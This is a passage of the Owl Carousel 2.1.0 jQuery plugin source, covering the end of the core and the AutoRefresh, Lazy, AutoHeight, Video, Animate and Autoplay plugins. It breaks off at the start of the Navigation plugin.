	 * @todo Replace by a more generic approach
	 * @protected
	 */
	Owl.prototype.preloadAutoWidthImages = function(images) {
		images.each($.proxy(function(i, element) {
			this.enter('pre-loading');
			element = $(element);
			$(new Image()).one('load', $.proxy(function(e) {
				element.attr('src', e.target.src);
				element.css('opacity', 1);
				this.leave('pre-loading');
				!this.is('pre-loading') && !this.is('initializing') && this.refresh();
			}, this)).attr('src', element.attr('src') || element.attr('data-src') || element.attr('data-src-retina'));
		}, this));
	};

	/**
	 * Destroys the carousel.
	 * @public
	 */
	Owl.prototype.destroy = function() {

		this.$element.off('.owl.core');
		this.$stage.off('.owl.core');
		$(document).off('.owl.core');

		if (this.settings.responsive !== false) {
			window.clearTimeout(this.resizeTimer);
			this.off(window, 'resize', this._handlers.onThrottledResize);
		}

		for (var i in this._plugins) {
			this._plugins[i].destroy();
		}

		this.$stage.children('.cloned').remove();

		this.$stage.unwrap();
		this.$stage.children().contents().unwrap();
		this.$stage.children().unwrap();

		this.$element
			.removeClass(this.options.refreshClass)
			.removeClass(this.options.loadingClass)
			.removeClass(this.options.loadedClass)
			.removeClass(this.options.rtlClass)
			.removeClass(this.options.dragClass)
			.removeClass(this.options.grabClass)
			.attr('class', this.$element.attr('class').replace(new RegExp(this.options.responsiveClass + '-\\S+\\s', 'g'), ''))
			.removeData('owl.carousel');
	};

	/**
	 * Operators to calculate right-to-left and left-to-right.
	 * @protected
	 * @param {Number} [a] - The left side operand.
	 * @param {String} [o] - The operator.
	 * @param {Number} [b] - The right side operand.
	 */
	Owl.prototype.op = function(a, o, b) {
		var rtl = this.settings.rtl;
		switch (o) {
			case '<':
				return rtl ? a > b : a < b;
			case '>':
				return rtl ? a < b : a > b;
			case '>=':
				return rtl ? a <= b : a >= b;
			case '<=':
				return rtl ? a >= b : a <= b;
			default:
				break;
		}
	};

	/**
	 * Attaches to an internal event.
	 * @protected
	 * @param {HTMLElement} element - The event source.
	 * @param {String} event - The event name.
	 * @param {Function} listener - The event handler to attach.
	 * @param {Boolean} capture - Wether the event should be handled at the capturing phase or not.
	 */
	Owl.prototype.on = function(element, event, listener, capture) {
		if (element.addEventListener) {
			element.addEventListener(event, listener, capture);
		} else if (element.attachEvent) {
			element.attachEvent('on' + event, listener);
		}
	};

	/**
	 * Detaches from an internal event.
	 * @protected
	 * @param {HTMLElement} element - The event source.
	 * @param {String} event - The event name.
	 * @param {Function} listener - The attached event handler to detach.
	 * @param {Boolean} capture - Wether the attached event handler was registered as a capturing listener or not.
	 */
	Owl.prototype.off = function(element, event, listener, capture) {
		if (element.removeEventListener) {
			element.removeEventListener(event, listener, capture);
		} else if (element.detachEvent) {
			element.detachEvent('on' + event, listener);
		}
	};

	/**
	 * Triggers a public event.
	 * @todo Remove `status`, `relatedTarget` should be used instead.
	 * @protected
	 * @param {String} name - The event name.
	 * @param {*} [data=null] - The event data.
	 * @param {String} [namespace=carousel] - The event namespace.
	 * @param {String} [state] - The state which is associated with the event.
	 * @param {Boolean} [enter=false] - Indicates if the call enters the specified state or not.
	 * @returns {Event} - The event arguments.
	 */
	Owl.prototype.trigger = function(name, data, namespace, state, enter) {
		var status = {
			item: { count: this._items.length, index: this.current() }
		}, handler = $.camelCase(
			$.grep([ 'on', name, namespace ], function(v) { return v })
				.join('-').toLowerCase()
		), event = $.Event(
			[ name, 'owl', namespace || 'carousel' ].join('.').toLowerCase(),
			$.extend({ relatedTarget: this }, status, data)
		);

		if (!this._supress[name]) {
			$.each(this._plugins, function(name, plugin) {
				if (plugin.onTrigger) {
					plugin.onTrigger(event);
				}
			});

			this.register({ type: Owl.Type.Event, name: name });
			this.$element.trigger(event);

			if (this.settings && typeof this.settings[handler] === 'function') {
				this.settings[handler].call(this, event);
			}
		}

		return event;
	};

	/**
	 * Enters a state.
	 * @param name - The state name.
	 */
	Owl.prototype.enter = function(name) {
		$.each([ name ].concat(this._states.tags[name] || []), $.proxy(function(i, name) {
			if (this._states.current[name] === undefined) {
				this._states.current[name] = 0;
			}

			this._states.current[name]++;
		}, this));
	};

	/**
	 * Leaves a state.
	 * @param name - The state name.
	 */
	Owl.prototype.leave = function(name) {
		$.each([ name ].concat(this._states.tags[name] || []), $.proxy(function(i, name) {
			this._states.current[name]--;
		}, this));
	};

	/**
	 * Registers an event or state.
	 * @public
	 * @param {Object} object - The event or state to register.
	 */
	Owl.prototype.register = function(object) {
		if (object.type === Owl.Type.Event) {
			if (!$.event.special[object.name]) {
				$.event.special[object.name] = {};
			}

			if (!$.event.special[object.name].owl) {
				var _default = $.event.special[object.name]._default;
				$.event.special[object.name]._default = function(e) {
					if (_default && _default.apply && (!e.namespace || e.namespace.indexOf('owl') === -1)) {
						return _default.apply(this, arguments);
					}
					return e.namespace && e.namespace.indexOf('owl') > -1;
				};
				$.event.special[object.name].owl = true;
			}
		} else if (object.type === Owl.Type.State) {
			if (!this._states.tags[object.name]) {
				this._states.tags[object.name] = object.tags;
			} else {
				this._states.tags[object.name] = this._states.tags[object.name].concat(object.tags);
			}

			this._states.tags[object.name] = $.grep(this._states.tags[object.name], $.proxy(function(tag, i) {
				return $.inArray(tag, this._states.tags[object.name]) === i;
			}, this));
		}
	};

	/**
	 * Suppresses events.
	 * @protected
	 * @param {Array.<String>} events - The events to suppress.
	 */
	Owl.prototype.suppress = function(events) {
		$.each(events, $.proxy(function(index, event) {
			this._supress[event] = true;
		}, this));
	};

	/**
	 * Releases suppressed events.
	 * @protected
	 * @param {Array.<String>} events - The events to release.
	 */
	Owl.prototype.release = function(events) {
		$.each(events, $.proxy(function(index, event) {
			delete this._supress[event];
		}, this));
	};

	/**
	 * Gets unified pointer coordinates from event.
	 * @todo #261
	 * @protected
	 * @param {Event} - The `mousedown` or `touchstart` event.
	 * @returns {Object} - Contains `x` and `y` coordinates of current pointer position.
	 */
	Owl.prototype.pointer = function(event) {
		var result = { x: null, y: null };

		event = event.originalEvent || event || window.event;

		event = event.touches && event.touches.length ?
			event.touches[0] : event.changedTouches && event.changedTouches.length ?
				event.changedTouches[0] : event;

		if (event.pageX) {
			result.x = event.pageX;
			result.y = event.pageY;
		} else {
			result.x = event.clientX;
			result.y = event.clientY;
		}

		return result;
	};

	/**
	 * Determines if the input is a Number or something that can be coerced to a Number
	 * @protected
	 * @param {Number|String|Object|Array|Boolean|RegExp|Function|Symbol} - The input to be tested
	 * @returns {Boolean} - An indication if the input is a Number or can be coerced to a Number
	 */
	Owl.prototype.isNumeric = function(number) {
		return !isNaN(parseFloat(number));
	};

	/**
	 * Gets the difference of two vectors.
	 * @todo #261
	 * @protected
	 * @param {Object} - The first vector.
	 * @param {Object} - The second vector.
	 * @returns {Object} - The difference.
	 */
	Owl.prototype.difference = function(first, second) {
		return {
			x: first.x - second.x,
			y: first.y - second.y
		};
	};

	/**
	 * The jQuery Plugin for the Owl Carousel
	 * @todo Navigation plugin `next` and `prev`
	 * @public
	 */
	$.fn.owlCarousel = function(option) {
		var args = Array.prototype.slice.call(arguments, 1);

		return this.each(function() {
			var $this = $(this),
				data = $this.data('owl.carousel');

			if (!data) {
				data = new Owl(this, typeof option == 'object' && option);
				$this.data('owl.carousel', data);

				$.each([
					'next', 'prev', 'to', 'destroy', 'refresh', 'replace', 'add', 'remove'
				], function(i, event) {
					data.register({ type: Owl.Type.Event, name: event });
					data.$element.on(event + '.owl.carousel.core', $.proxy(function(e) {
						if (e.namespace && e.relatedTarget !== this) {
							this.suppress([ event ]);
							data[event].apply(this, [].slice.call(arguments, 1));
							this.release([ event ]);
						}
					}, data));
				});
			}

			if (typeof option == 'string' && option.charAt(0) !== '_') {
				data[option].apply(data, args);
			}
		});
	};

	/**
	 * The constructor for the jQuery Plugin
	 * @public
	 */
	$.fn.owlCarousel.Constructor = Owl;

})(window.Zepto || window.jQuery, window, document);

/**
 * AutoRefresh Plugin
 * @version 2.1.0
 * @author Artus Kolanowski
 * @author David Deutsch
 * @license The MIT License (MIT)
 */
;(function($, window, document, undefined) {

	/**
	 * Creates the auto refresh plugin.
	 * @class The Auto Refresh Plugin
	 * @param {Owl} carousel - The Owl Carousel
	 */
	var AutoRefresh = function(carousel) {
		/**
		 * Reference to the core.
		 * @protected
		 * @type {Owl}
		 */
		this._core = carousel;

		/**
		 * Refresh interval.
		 * @protected
		 * @type {number}
		 */
		this._interval = null;

		/**
		 * Whether the element is currently visible or not.
		 * @protected
		 * @type {Boolean}
		 */
		this._visible = null;

		/**
		 * All event handlers.
		 * @protected
		 * @type {Object}
		 */
		this._handlers = {
			'initialized.owl.carousel': $.proxy(function(e) {
				if (e.namespace && this._core.settings.autoRefresh) {
					this.watch();
				}
			}, this)
		};

		// set default options
		this._core.options = $.extend({}, AutoRefresh.Defaults, this._core.options);

		// register event handlers
		this._core.$element.on(this._handlers);
	};

	/**
	 * Default options.
	 * @public
	 */
	AutoRefresh.Defaults = {
		autoRefresh: true,
		autoRefreshInterval: 500
	};

	/**
	 * Watches the element.
	 */
	AutoRefresh.prototype.watch = function() {
		if (this._interval) {
			return;
		}

		this._visible = this._core.$element.is(':visible');
		this._interval = window.setInterval($.proxy(this.refresh, this), this._core.settings.autoRefreshInterval);
	};

	/**
	 * Refreshes the element.
	 */
	AutoRefresh.prototype.refresh = function() {
		if (this._core.$element.is(':visible') === this._visible) {
			return;
		}

		this._visible = !this._visible;

		this._core.$element.toggleClass('owl-hidden', !this._visible);

		this._visible && (this._core.invalidate('width') && this._core.refresh());
	};

	/**
	 * Destroys the plugin.
	 */
	AutoRefresh.prototype.destroy = function() {
		var handler, property;

		window.clearInterval(this._interval);

		for (handler in this._handlers) {
			this._core.$element.off(handler, this._handlers[handler]);
		}
		for (property in Object.getOwnPropertyNames(this)) {
			typeof this[property] != 'function' && (this[property] = null);
		}
	};

	$.fn.owlCarousel.Constructor.Plugins.AutoRefresh = AutoRefresh;

})(window.Zepto || window.jQuery, window, document);

/**
 * Lazy Plugin
 * @version 2.1.0
 * @author Bartosz Wojciechowski
 * @author David Deutsch
 * @license The MIT License (MIT)
 */
;(function($, window, document, undefined) {

	/**
	 * Creates the lazy plugin.
	 * @class The Lazy Plugin
	 * @param {Owl} carousel - The Owl Carousel
	 */
	var Lazy = function(carousel) {

		/**
		 * Reference to the core.
		 * @protected
		 * @type {Owl}
		 */
		this._core = carousel;

		/**
		 * Already loaded items.
		 * @protected
		 * @type {Array.<jQuery>}
		 */
		this._loaded = [];

		/**
		 * Event handlers.
		 * @protected
		 * @type {Object}
		 */
		this._handlers = {
			'initialized.owl.carousel change.owl.carousel resized.owl.carousel': $.proxy(function(e) {
				if (!e.namespace) {
					return;
				}

				if (!this._core.settings || !this._core.settings.lazyLoad) {
					return;
				}

				if ((e.property && e.property.name == 'position') || e.type == 'initialized') {
					var settings = this._core.settings,
						n = (settings.center && Math.ceil(settings.items / 2) || settings.items),
						i = ((settings.center && n * -1) || 0),
						position = (e.property && e.property.value !== undefined ? e.property.value : this._core.current()) + i,
						clones = this._core.clones().length,
						load = $.proxy(function(i, v) { this.load(v) }, this);

					while (i++ < n) {
						this.load(clones / 2 + this._core.relative(position));
						clones && $.each(this._core.clones(this._core.relative(position)), load);
						position++;
					}
				}
			}, this)
		};

		// set the default options
		this._core.options = $.extend({}, Lazy.Defaults, this._core.options);

		// register event handler
		this._core.$element.on(this._handlers);
	};

	/**
	 * Default options.
	 * @public
	 */
	Lazy.Defaults = {
		lazyLoad: false
	};

	/**
	 * Loads all resources of an item at the specified position.
	 * @param {Number} position - The absolute position of the item.
	 * @protected
	 */
	Lazy.prototype.load = function(position) {
		var $item = this._core.$stage.children().eq(position),
			$elements = $item && $item.find('.owl-lazy');

		if (!$elements || $.inArray($item.get(0), this._loaded) > -1) {
			return;
		}

		$elements.each($.proxy(function(index, element) {
			var $element = $(element), image,
				url = (window.devicePixelRatio > 1 && $element.attr('data-src-retina')) || $element.attr('data-src');

			this._core.trigger('load', { element: $element, url: url }, 'lazy');

			if ($element.is('img')) {
				$element.one('load.owl.lazy', $.proxy(function() {
					$element.css('opacity', 1);
					this._core.trigger('loaded', { element: $element, url: url }, 'lazy');
				}, this)).attr('src', url);
			} else {
				image = new Image();
				image.onload = $.proxy(function() {
					$element.css({
						'background-image': 'url(' + url + ')',
						'opacity': '1'
					});
					this._core.trigger('loaded', { element: $element, url: url }, 'lazy');
				}, this);
				image.src = url;
			}
		}, this));

		this._loaded.push($item.get(0));
	};

	/**
	 * Destroys the plugin.
	 * @public
	 */
	Lazy.prototype.destroy = function() {
		var handler, property;

		for (handler in this.handlers) {
			this._core.$element.off(handler, this.handlers[handler]);
		}
		for (property in Object.getOwnPropertyNames(this)) {
			typeof this[property] != 'function' && (this[property] = null);
		}
	};

	$.fn.owlCarousel.Constructor.Plugins.Lazy = Lazy;

})(window.Zepto || window.jQuery, window, document);

/**
 * AutoHeight Plugin
 * @version 2.1.0
 * @author Bartosz Wojciechowski
 * @author David Deutsch
 * @license The MIT License (MIT)
 */
;(function($, window, document, undefined) {

	/**
	 * Creates the auto height plugin.
	 * @class The Auto Height Plugin
	 * @param {Owl} carousel - The Owl Carousel
	 */
	var AutoHeight = function(carousel) {
		/**
		 * Reference to the core.
		 * @protected
		 * @type {Owl}
		 */
		this._core = carousel;

		/**
		 * All event handlers.
		 * @protected
		 * @type {Object}
		 */
		this._handlers = {
			'initialized.owl.carousel refreshed.owl.carousel': $.proxy(function(e) {
				if (e.namespace && this._core.settings.autoHeight) {
					this.update();
				}
			}, this),
			'changed.owl.carousel': $.proxy(function(e) {
				if (e.namespace && this._core.settings.autoHeight && e.property.name == 'position'){
					this.update();
				}
			}, this),
			'loaded.owl.lazy': $.proxy(function(e) {
				if (e.namespace && this._core.settings.autoHeight
					&& e.element.closest('.' + this._core.settings.itemClass).index() === this._core.current()) {
					this.update();
				}
			}, this)
		};

		// set default options
		this._core.options = $.extend({}, AutoHeight.Defaults, this._core.options);

		// register event handlers
		this._core.$element.on(this._handlers);
	};

	/**
	 * Default options.
	 * @public
	 */
	AutoHeight.Defaults = {
		autoHeight: false,
		autoHeightClass: 'owl-height'
	};

	/**
	 * Updates the view.
	 */
	AutoHeight.prototype.update = function() {
		var start = this._core._current,
			end = start + this._core.settings.items,
			visible = this._core.$stage.children().toArray().slice(start, end),
			heights = [],
			maxheight = 0;

		$.each(visible, function(index, item) {
			heights.push($(item).height());
		});

		maxheight = Math.max.apply(null, heights);

		this._core.$stage.parent()
			.height(maxheight)
			.addClass(this._core.settings.autoHeightClass);
	};

	AutoHeight.prototype.destroy = function() {
		var handler, property;

		for (handler in this._handlers) {
			this._core.$element.off(handler, this._handlers[handler]);
		}
		for (property in Object.getOwnPropertyNames(this)) {
			typeof this[property] != 'function' && (this[property] = null);
		}
	};

	$.fn.owlCarousel.Constructor.Plugins.AutoHeight = AutoHeight;

})(window.Zepto || window.jQuery, window, document);

/**
 * Video Plugin
 * @version 2.1.0
 * @author Bartosz Wojciechowski
 * @author David Deutsch
 * @license The MIT License (MIT)
 */
;(function($, window, document, undefined) {

	/**
	 * Creates the video plugin.
	 * @class The Video Plugin
	 * @param {Owl} carousel - The Owl Carousel
	 */
	var Video = function(carousel) {
		/**
		 * Reference to the core.
		 * @protected
		 * @type {Owl}
		 */
		this._core = carousel;

		/**
		 * Cache all video URLs.
		 * @protected
		 * @type {Object}
		 */
		this._videos = {};

		/**
		 * Current playing item.
		 * @protected
		 * @type {jQuery}
		 */
		this._playing = null;

		/**
		 * All event handlers.
		 * @todo The cloned content removale is too late
		 * @protected
		 * @type {Object}
		 */
		this._handlers = {
			'initialized.owl.carousel': $.proxy(function(e) {
				if (e.namespace) {
					this._core.register({ type: 'state', name: 'playing', tags: [ 'interacting' ] });
				}
			}, this),
			'resize.owl.carousel': $.proxy(function(e) {
				if (e.namespace && this._core.settings.video && this.isInFullScreen()) {
					e.preventDefault();
				}
			}, this),
			'refreshed.owl.carousel': $.proxy(function(e) {
				if (e.namespace && this._core.is('resizing')) {
					this._core.$stage.find('.cloned .owl-video-frame').remove();
				}
			}, this),
			'changed.owl.carousel': $.proxy(function(e) {
				if (e.namespace && e.property.name === 'position' && this._playing) {
					this.stop();
				}
			}, this),
			'prepared.owl.carousel': $.proxy(function(e) {
				if (!e.namespace) {
					return;
				}

				var $element = $(e.content).find('.owl-video');

				if ($element.length) {
					$element.css('display', 'none');
					this.fetch($element, $(e.content));
				}
			}, this)
		};

		// set default options
		this._core.options = $.extend({}, Video.Defaults, this._core.options);

		// register event handlers
		this._core.$element.on(this._handlers);

		this._core.$element.on('click.owl.video', '.owl-video-play-icon', $.proxy(function(e) {
			this.play(e);
		}, this));
	};

	/**
	 * Default options.
	 * @public
	 */
	Video.Defaults = {
		video: false,
		videoHeight: false,
		videoWidth: false
	};

	/**
	 * Gets the video ID and the type (YouTube/Vimeo/vzaar only).
	 * @protected
	 * @param {jQuery} target - The target containing the video data.
	 * @param {jQuery} item - The item containing the video.
	 */
	Video.prototype.fetch = function(target, item) {
			var type = (function() {
					if (target.attr('data-vimeo-id')) {
						return 'vimeo';
					} else if (target.attr('data-vzaar-id')) {
						return 'vzaar'
					} else {
						return 'youtube';
					}
				})(),
				id = target.attr('data-vimeo-id') || target.attr('data-youtube-id') || target.attr('data-vzaar-id'),
				width = target.attr('data-width') || this._core.settings.videoWidth,
				height = target.attr('data-height') || this._core.settings.videoHeight,
				url = target.attr('href');

		if (url) {

			/*
					Parses the id's out of the following urls (and probably more):
					https://www.youtube.com/watch?v=:id
					https://youtu.be/:id
					https://vimeo.com/:id
					https://vimeo.com/channels/:channel/:id
					https://vimeo.com/groups/:group/videos/:id
					https://app.vzaar.com/videos/:id

					Visual example: https://regexper.com/#(http%3A%7Chttps%3A%7C)%5C%2F%5C%2F(player.%7Cwww.%7Capp.)%3F(vimeo%5C.com%7Cyoutu(be%5C.com%7C%5C.be%7Cbe%5C.googleapis%5C.com)%7Cvzaar%5C.com)%5C%2F(video%5C%2F%7Cvideos%5C%2F%7Cembed%5C%2F%7Cchannels%5C%2F.%2B%5C%2F%7Cgroups%5C%2F.%2B%5C%2F%7Cwatch%5C%3Fv%3D%7Cv%5C%2F)%3F(%5BA-Za-z0-9._%25-%5D*)(%5C%26%5CS%2B)%3F
			*/

			id = url.match(/(http:|https:|)\/\/(player.|www.|app.)?(vimeo\.com|youtu(be\.com|\.be|be\.googleapis\.com)|vzaar\.com)\/(video\/|videos\/|embed\/|channels\/.+\/|groups\/.+\/|watch\?v=|v\/)?([A-Za-z0-9._%-]*)(\&\S+)?/);

			if (id[3].indexOf('youtu') > -1) {
				type = 'youtube';
			} else if (id[3].indexOf('vimeo') > -1) {
				type = 'vimeo';
			} else if (id[3].indexOf('vzaar') > -1) {
				type = 'vzaar';
			} else {
				throw new Error('Video URL not supported.');
			}
			id = id[6];
		} else {
			throw new Error('Missing video URL.');
		}

		this._videos[url] = {
			type: type,
			id: id,
			width: width,
			height: height
		};

		item.attr('data-video', url);

		this.thumbnail(target, this._videos[url]);
	};

	/**
	 * Creates video thumbnail.
	 * @protected
	 * @param {jQuery} target - The target containing the video data.
	 * @param {Object} info - The video info object.
	 * @see `fetch`
	 */
	Video.prototype.thumbnail = function(target, video) {
		var tnLink,
			icon,
			path,
			dimensions = video.width && video.height ? 'style="width:' + video.width + 'px;height:' + video.height + 'px;"' : '',
			customTn = target.find('img'),
			srcType = 'src',
			lazyClass = '',
			settings = this._core.settings,
			create = function(path) {
				icon = '<div class="owl-video-play-icon"></div>';

				if (settings.lazyLoad) {
					tnLink = '<div class="owl-video-tn ' + lazyClass + '" ' + srcType + '="' + path + '"></div>';
				} else {
					tnLink = '<div class="owl-video-tn" style="opacity:1;background-image:url(' + path + ')"></div>';
				}
				target.after(tnLink);
				target.after(icon);
			};

		// wrap video content into owl-video-wrapper div
		target.wrap('<div class="owl-video-wrapper"' + dimensions + '></div>');

		if (this._core.settings.lazyLoad) {
			srcType = 'data-src';
			lazyClass = 'owl-lazy';
		}

		// custom thumbnail
		if (customTn.length) {
			create(customTn.attr(srcType));
			customTn.remove();
			return false;
		}

		if (video.type === 'youtube') {
			path = "//img.youtube.com/vi/" + video.id + "/hqdefault.jpg";
			create(path);
		} else if (video.type === 'vimeo') {
			$.ajax({
				type: 'GET',
				url: '//vimeo.com/api/v2/video/' + video.id + '.json',
				jsonp: 'callback',
				dataType: 'jsonp',
				success: function(data) {
					path = data[0].thumbnail_large;
					create(path);
				}
			});
		} else if (video.type === 'vzaar') {
			$.ajax({
				type: 'GET',
				url: '//vzaar.com/api/videos/' + video.id + '.json',
				jsonp: 'callback',
				dataType: 'jsonp',
				success: function(data) {
					path = data.framegrab_url;
					create(path);
				}
			});
		}
	};

	/**
	 * Stops the current video.
	 * @public
	 */
	Video.prototype.stop = function() {
		this._core.trigger('stop', null, 'video');
		this._playing.find('.owl-video-frame').remove();
		this._playing.removeClass('owl-video-playing');
		this._playing = null;
		this._core.leave('playing');
		this._core.trigger('stopped', null, 'video');
	};

	/**
	 * Starts the current video.
	 * @public
	 * @param {Event} event - The event arguments.
	 */
	Video.prototype.play = function(event) {
		var target = $(event.target),
			item = target.closest('.' + this._core.settings.itemClass),
			video = this._videos[item.attr('data-video')],
			width = video.width || '100%',
			height = video.height || this._core.$stage.height(),
			html;

		if (this._playing) {
			return;
		}

		this._core.enter('playing');
		this._core.trigger('play', null, 'video');

		item = this._core.items(this._core.relative(item.index()));

		this._core.reset(item.index());

		if (video.type === 'youtube') {
			html = '<iframe width="' + width + '" height="' + height + '" src="//www.youtube.com/embed/' +
				video.id + '?autoplay=1&v=' + video.id + '" frameborder="0" allowfullscreen></iframe>';
		} else if (video.type === 'vimeo') {
			html = '<iframe src="//player.vimeo.com/video/' + video.id +
				'?autoplay=1" width="' + width + '" height="' + height +
				'" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe>';
		} else if (video.type === 'vzaar') {
			html = '<iframe frameborder="0"' + 'height="' + height + '"' + 'width="' + width +
				'" allowfullscreen mozallowfullscreen webkitAllowFullScreen ' +
				'src="//view.vzaar.com/' + video.id + '/player?autoplay=true"></iframe>';
		}

		$('<div class="owl-video-frame">' + html + '</div>').insertAfter(item.find('.owl-video'));

		this._playing = item.addClass('owl-video-playing');
	};

	/**
	 * Checks whether an video is currently in full screen mode or not.
	 * @todo Bad style because looks like a readonly method but changes members.
	 * @protected
	 * @returns {Boolean}
	 */
	Video.prototype.isInFullScreen = function() {
		var element = document.fullscreenElement || document.mozFullScreenElement ||
				document.webkitFullscreenElement;

		return element && $(element).parent().hasClass('owl-video-frame');
	};

	/**
	 * Destroys the plugin.
	 */
	Video.prototype.destroy = function() {
		var handler, property;

		this._core.$element.off('click.owl.video');

		for (handler in this._handlers) {
			this._core.$element.off(handler, this._handlers[handler]);
		}
		for (property in Object.getOwnPropertyNames(this)) {
			typeof this[property] != 'function' && (this[property] = null);
		}
	};

	$.fn.owlCarousel.Constructor.Plugins.Video = Video;

})(window.Zepto || window.jQuery, window, document);

/**
 * Animate Plugin
 * @version 2.1.0
 * @author Bartosz Wojciechowski
 * @author David Deutsch
 * @license The MIT License (MIT)
 */
;(function($, window, document, undefined) {

	/**
	 * Creates the animate plugin.
	 * @class The Navigation Plugin
	 * @param {Owl} scope - The Owl Carousel
	 */
	var Animate = function(scope) {
		this.core = scope;
		this.core.options = $.extend({}, Animate.Defaults, this.core.options);
		this.swapping = true;
		this.previous = undefined;
		this.next = undefined;

		this.handlers = {
			'change.owl.carousel': $.proxy(function(e) {
				if (e.namespace && e.property.name == 'position') {
					this.previous = this.core.current();
					this.next = e.property.value;
				}
			}, this),
			'drag.owl.carousel dragged.owl.carousel translated.owl.carousel': $.proxy(function(e) {
				if (e.namespace) {
					this.swapping = e.type == 'translated';
				}
			}, this),
			'translate.owl.carousel': $.proxy(function(e) {
				if (e.namespace && this.swapping && (this.core.options.animateOut || this.core.options.animateIn)) {
					this.swap();
				}
			}, this)
		};

		this.core.$element.on(this.handlers);
	};

	/**
	 * Default options.
	 * @public
	 */
	Animate.Defaults = {
		animateOut: false,
		animateIn: false
	};

	/**
	 * Toggles the animation classes whenever an translations starts.
	 * @protected
	 * @returns {Boolean|undefined}
	 */
	Animate.prototype.swap = function() {

		if (this.core.settings.items !== 1) {
			return;
		}

		if (!$.support.animation || !$.support.transition) {
			return;
		}

		this.core.speed(0);

		var left,
			clear = $.proxy(this.clear, this),
			previous = this.core.$stage.children().eq(this.previous),
			next = this.core.$stage.children().eq(this.next),
			incoming = this.core.settings.animateIn,
			outgoing = this.core.settings.animateOut;

		if (this.core.current() === this.previous) {
			return;
		}

		if (outgoing) {
			left = this.core.coordinates(this.previous) - this.core.coordinates(this.next);
			previous.one($.support.animation.end, clear)
				.css( { 'left': left + 'px' } )
				.addClass('animated owl-animated-out')
				.addClass(outgoing);
		}

		if (incoming) {
			next.one($.support.animation.end, clear)
				.addClass('animated owl-animated-in')
				.addClass(incoming);
		}
	};

	Animate.prototype.clear = function(e) {
		$(e.target).css( { 'left': '' } )
			.removeClass('animated owl-animated-out owl-animated-in')
			.removeClass(this.core.settings.animateIn)
			.removeClass(this.core.settings.animateOut);
		this.core.onTransitionEnd();
	};

	/**
	 * Destroys the plugin.
	 * @public
	 */
	Animate.prototype.destroy = function() {
		var handler, property;

		for (handler in this.handlers) {
			this.core.$element.off(handler, this.handlers[handler]);
		}
		for (property in Object.getOwnPropertyNames(this)) {
			typeof this[property] != 'function' && (this[property] = null);
		}
	};

	$.fn.owlCarousel.Constructor.Plugins.Animate = Animate;

})(window.Zepto || window.jQuery, window, document);

/**
 * Autoplay Plugin
 * @version 2.1.0
 * @author Bartosz Wojciechowski
 * @author Artus Kolanowski
 * @author David Deutsch
 * @license The MIT License (MIT)
 */
;(function($, window, document, undefined) {

	/**
	 * Creates the autoplay plugin.
	 * @class The Autoplay Plugin
	 * @param {Owl} scope - The Owl Carousel
	 */
	var Autoplay = function(carousel) {
		/**
		 * Reference to the core.
		 * @protected
		 * @type {Owl}
		 */
		this._core = carousel;

		/**
		 * The autoplay timeout.
		 * @type {Timeout}
		 */
		this._timeout = null;

		/**
		 * Indicates whenever the autoplay is paused.
		 * @type {Boolean}
		 */
		this._paused = false;

		/**
		 * All event handlers.
		 * @protected
		 * @type {Object}
		 */
		this._handlers = {
			'changed.owl.carousel': $.proxy(function(e) {
				if (e.namespace && e.property.name === 'settings') {
					if (this._core.settings.autoplay) {
						this.play();
					} else {
						this.stop();
					}
				} else if (e.namespace && e.property.name === 'position') {
					//console.log('play?', e);
					if (this._core.settings.autoplay) {
						this._setAutoPlayInterval();
					}
				}
			}, this),
			'initialized.owl.carousel': $.proxy(function(e) {
				if (e.namespace && this._core.settings.autoplay) {
					this.play();
				}
			}, this),
			'play.owl.autoplay': $.proxy(function(e, t, s) {
				if (e.namespace) {
					this.play(t, s);
				}
			}, this),
			'stop.owl.autoplay': $.proxy(function(e) {
				if (e.namespace) {
					this.stop();
				}
			}, this),
			'mouseover.owl.autoplay': $.proxy(function() {
				if (this._core.settings.autoplayHoverPause && this._core.is('rotating')) {
					this.pause();
				}
			}, this),
			'mouseleave.owl.autoplay': $.proxy(function() {
				if (this._core.settings.autoplayHoverPause && this._core.is('rotating')) {
					this.play();
				}
			}, this),
			'touchstart.owl.core': $.proxy(function() {
				if (this._core.settings.autoplayHoverPause && this._core.is('rotating')) {
					this.pause();
				}
			}, this),
			'touchend.owl.core': $.proxy(function() {
				if (this._core.settings.autoplayHoverPause) {
					this.play();
				}
			}, this)
		};

		// register event handlers
		this._core.$element.on(this._handlers);

		// set default options
		this._core.options = $.extend({}, Autoplay.Defaults, this._core.options);
	};

	/**
	 * Default options.
	 * @public
	 */
	Autoplay.Defaults = {
		autoplay: false,
		autoplayTimeout: 5000,
		autoplayHoverPause: false,
		autoplaySpeed: false
	};

	/**
	 * Starts the autoplay.
	 * @public
	 * @param {Number} [timeout] - The interval before the next animation starts.
	 * @param {Number} [speed] - The animation speed for the animations.
	 */
	Autoplay.prototype.play = function(timeout, speed) {
		this._paused = false;

		if (this._core.is('rotating')) {
			return;
		}

		this._core.enter('rotating');

		this._setAutoPlayInterval();
	};

	/**
	 * Gets a new timeout
	 * @private
	 * @param {Number} [timeout] - The interval before the next animation starts.
	 * @param {Number} [speed] - The animation speed for the animations.
	 * @return {Timeout}
	 */
	Autoplay.prototype._getNextTimeout = function(timeout, speed) {
		if ( this._timeout ) {
			window.clearTimeout(this._timeout);
		}
		return window.setTimeout($.proxy(function() {
			if (this._paused || this._core.is('busy') || this._core.is('interacting') || document.hidden) {
				return;
			}
			this._core.next(speed || this._core.settings.autoplaySpeed);
		}, this), timeout || this._core.settings.autoplayTimeout);
	};

	/**
	 * Sets autoplay in motion.
	 * @private
	 */
	Autoplay.prototype._setAutoPlayInterval = function() {
		this._timeout = this._getNextTimeout();
	};

	/**
	 * Stops the autoplay.
	 * @public
	 */
	Autoplay.prototype.stop = function() {
		if (!this._core.is('rotating')) {
			return;
		}

		window.clearTimeout(this._timeout);
		this._core.leave('rotating');
	};

	/**
	 * Stops the autoplay.
	 * @public
	 */
	Autoplay.prototype.pause = function() {
		if (!this._core.is('rotating')) {
			return;
		}

		this._paused = true;
	};

	/**
	 * Destroys the plugin.
	 */
	Autoplay.prototype.destroy = function() {
		var handler, property;

		this.stop();

		for (handler in this._handlers) {
			this._core.$element.off(handler, this._handlers[handler]);
		}
		for (property in Object.getOwnPropertyNames(this)) {
			typeof this[property] != 'function' && (this[property] = null);
		}
	};

	$.fn.owlCarousel.Constructor.Plugins.autoplay = Autoplay;

})(window.Zepto || window.jQuery, window, document);

/**
 * Navigation Plugin
 * @version 2.1.0
 * @author Artus Kolanowski
 * @author David Deutsch
 * @license The MIT License (MIT)
 */
;(function($, window, document, undefined) {
	'use strict';

	/**
